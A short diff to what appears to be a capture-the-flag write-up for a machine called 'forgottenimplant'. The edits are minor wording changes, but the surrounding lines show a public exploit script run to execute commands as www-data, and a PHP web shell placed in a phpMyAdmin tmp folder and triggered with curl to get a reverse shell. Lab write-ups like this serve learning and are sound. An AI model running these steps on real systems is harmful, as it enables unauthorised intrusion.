@@ -328,6 +328,7 @@ ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app s4Ucbrme id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
+We can upload our shell of choice and call it with this script to obtain a new shell as www-data.
 
 ### Alternate Path
 
@@ -391,7 +392,7 @@ shell.php           100%[===================>]   5.36K  --.-KB/s    in 0.001s
 ada@forgottenimplant:/var/www/phpmyadmin/tmp$ curl 127.0.0.1/tmp/shell.php
 ```
 
-With the above we receive a connection back in our new shell as www-data
+With the above we receive a connection back in our new shell as www-data.
 
 ## Become root
 
